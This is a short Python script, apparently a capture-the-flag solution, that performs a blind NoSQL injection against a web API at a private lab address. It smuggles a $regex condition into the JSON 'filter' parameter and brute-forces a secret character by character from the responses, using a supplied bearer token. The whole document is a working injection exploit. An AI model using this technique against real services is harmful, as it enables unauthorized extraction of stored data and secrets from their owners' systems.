import requests
import sys

url = 'http://192.168.98.129:3000/api/v2/data?filter=", "address":{"$regex":"^'

flag = ''
wl = 'ABCDEFabcdef0123456789{}_'
while True:
    tmp = flag
    for i in wl:
        token = sys.argv[1]
        tmp += i
        res = requests.get(url + tmp + '"}, "role":"guest', headers={"Authorization":"Bearer %s" % token}) 
        tmp = flag
        if '1' in res.text:
            flag += i
            print(flag)

print("[+] Final flag: %s" % flag)
    


